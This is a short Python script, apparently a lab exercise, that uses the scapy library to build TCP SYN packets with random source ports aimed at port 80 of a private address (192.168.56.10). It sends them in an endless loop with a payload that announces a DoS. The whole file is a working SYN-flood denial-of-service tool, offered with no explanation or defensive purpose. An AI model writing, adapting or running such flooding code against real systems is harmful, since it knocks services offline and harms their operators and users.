from scapy.all import *

target_ip = "192.168.56.10"
target_port = 80

ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

raw = Raw(b"Nemam cas delam DoS")

p = ip / tcp / raw
send(p, loop=1, verbose=0)